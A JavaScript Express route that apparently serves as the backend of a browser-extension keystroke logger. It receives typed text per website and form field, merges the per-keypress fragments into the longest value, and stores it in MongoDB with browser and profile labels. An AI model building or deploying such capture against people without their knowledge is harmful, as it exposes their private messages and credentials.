import express from 'express'
import { storeEvents } from '../services/mongodb.js'

const router = express.Router()

// ─── Deduplication ─────────────────────────────────────────
// React SPAs (claude.ai, notion, etc) trigger blur on every keypress
// causing extension to flush buffer each keystroke → progressive chunks:
// "h", "he", "hel", "hell", "hello"
// We keep only the longest value per hostname+field combination

function deduplicateEvents(events) {
    const keystrokeGroups = {}
    const nonKeystrokes = []

    events.forEach(e => {
        if (e.type !== 'keystroke') {
            nonKeystrokes.push(e)
            return
        }
        const minute = e.time ? e.time.substring(0, 5) : 'unknown'
        const key = `${e.hostname}|${e.field}|${minute}`

        if (!keystrokeGroups[key]) {
            keystrokeGroups[key] = e
        } else {
            // keep only longest value — that's the most complete version
            const existing = keystrokeGroups[key].text || ''
            const incoming = e.text || ''
            if (incoming.length > existing.length) {
                keystrokeGroups[key] = e
            }
        }
    })

    const dedupedKeystrokes = Object.values(keystrokeGroups)
    const result = [...nonKeystrokes, ...dedupedKeystrokes]

    return result
}

// ─── Route ─────────────────────────────────────────────────

router.post('/', async (req, res) => {
    try {
        const { events, browser, profile } = req.body

        if (!events || !Array.isArray(events) || events.length === 0) {
            return res.status(400).json({ status: 'error', message: 'no events' })
        }

        const cleanEvents = deduplicateEvents(events)

        await storeEvents(cleanEvents, browser || '', profile || '')

        console.log(`[Ingest] Raw: ${events.length} → Deduped: ${cleanEvents.length} | browser: ${browser} | profile: ${profile}`)

        res.json({ status: 'ok', raw: events.length, stored: cleanEvents.length })

    } catch (err) {
        console.error('[Ingest] Error:', err.message)
        res.status(500).json({ status: 'error', message: err.message })
    }
})

export default router